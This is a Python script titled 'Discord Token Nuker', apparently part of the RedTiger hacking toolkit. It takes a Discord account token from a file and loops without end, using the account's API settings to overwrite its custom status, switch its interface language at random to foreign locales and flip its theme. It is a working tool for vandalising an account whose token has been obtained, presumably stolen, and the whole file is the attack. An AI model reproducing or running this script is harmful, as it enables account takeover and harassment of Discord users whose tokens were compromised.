from Config.Util import *
from Config.config import *
import requests
import time
from itertools import cycle
import random

try:
    Title("Discord Token Nuker")

    print()
    with open('TokenDisc.txt', 'r') as f:
        token = f.read().strip()
    headers = {'Authorization': token, 'Content-Type': 'application/json'}

    r = requests.get('https://discord.com/api/v8/users/@me', headers=headers)
    if r.status_code != 200:
        ErrorToken()

    github_tool = "YourToolName"  # Remplacez par le nom de votre outil GitHub
    default_status = f"Nuking By {github_tool}"
    custom_status = input(f"{color.RED}{INPUT} Enter Custom Status -> {color.RESET}")
    custom_status = f"{custom_status} | RedTiger"

    modes = cycle(["light", "dark"])

    while True:
        # Set default status
        CustomStatus_default = {"custom_status": {"text": default_status}}
        try:
            r = requests.patch("https://discord.com/api/v9/users/@me/settings", headers=headers, json=CustomStatus_default)
            print(f"{red}[{white}{current_time_hour()}{red}] {ADD} Status: {color.WHITE}Changed{color.RED} | Status Discord: {color.WHITE}{default_status}{color.RED}")
        except Exception as e:
            print(f"{red}[{white}{current_time_hour()}{red}] {ERROR} Status: {color.WHITE}Error {e}{color.RED} | Status Discord: {color.WHITE}{default_status}{color.RED}")

        # Set random language and theme
        for _ in range(5):
            try:
                random_language = random.choice(['ja', 'zh-TW', 'ko', 'zh-CN', 'th', 'uk', 'ru', 'el', 'cs'])
                setting = {'locale': random_language}
                requests.patch("https://discord.com/api/v7/users/@me/settings", headers=headers, json=setting)
                print(f"{red}[{white}{current_time_hour()}{red}] {ADD} Status: {color.WHITE}Changed{color.RED} | Language: {color.WHITE}{random_language}{color.RED}")
            except Exception as e:
                print(f"{red}[{white}{current_time_hour()}{red}] {ERROR} Status: {color.WHITE}Error {e}{color.RED}  | Language: {color.WHITE}{random_language}{color.RED}")

            try:
                theme = next(modes)
                setting = {'theme': theme}
                requests.patch("https://discord.com/api/v8/users/@me/settings", headers=headers, json=setting)
                print(f"{red}[{white}{current_time_hour()}{red}] {ADD} Status: {color.WHITE}Changed{color.RED} | Theme: {color.WHITE}{theme}{color.RED}")
            except Exception as e:
                print(f"{red}[{white}{current_time_hour()}{red}] {ERROR} Status: {color.WHITE}Error {e}{color.RED}  | Theme: {color.WHITE}{theme}{color.RED}")
            time.sleep(0.5)

        # Set custom status
        CustomStatus_custom = {"custom_status": {"text": custom_status}}
        try:
            r = requests.patch("https://discord.com/api/v9/users/@me/settings", headers=headers, json=CustomStatus_custom)
            print(f"{red}[{white}{current_time_hour()}{red}] {ADD} Status: {color.WHITE}Changed{color.RED} | Status Discord: {color.WHITE}{custom_status}{color.RED}")
        except Exception as e:
            print(f"{red}[{white}{current_time_hour()}{red}] {ERROR} Status: {color.WHITE}Error {e}{color.RED}  | Status Discord: {color.WHITE}{custom_status}{color.RED}")

        # Set random language and theme again after setting custom status
        for _ in range(5):
            try:
                random_language = random.choice(['ja', 'zh-TW', 'ko', 'zh-CN', 'th', 'uk', 'ru', 'el', 'cs'])
                setting = {'locale': random_language}
                requests.patch("https://discord.com/api/v7/users/@me/settings", headers=headers, json=setting)
                print(f"{red}[{white}{current_time_hour()}{red}] {ADD} Status: {color.WHITE}Changed{color.RED} | Language: {color.WHITE}{random_language}{color.RED}")
            except Exception as e:
                print(f"{red}[{white}{current_time_hour()}{red}] {ERROR} Status: {color.WHITE}Error {e}{color.RED}  | Language: {color.WHITE}{random_language}{color.RED}")

            try:
                theme = next(modes)
                setting = {'theme': theme}
                requests.patch("https://discord.com/api/v8/users/@me/settings", headers=headers, json=setting)
                print(f"{red}[{white}{current_time_hour()}{red}] {ADD} Status: {color.WHITE}Changed{color.RED} | Theme: {color.WHITE}{theme}{color.RED}")
            except Exception as e:
                print(f"{red}[{white}{current_time_hour()}{red}] {ERROR} Status: {color.WHITE}Error {e}{color.RED}  | Theme: {color.WHITE}{theme}{color.RED}")
            time.sleep(0.5)

except Exception as e:
    Error(e)
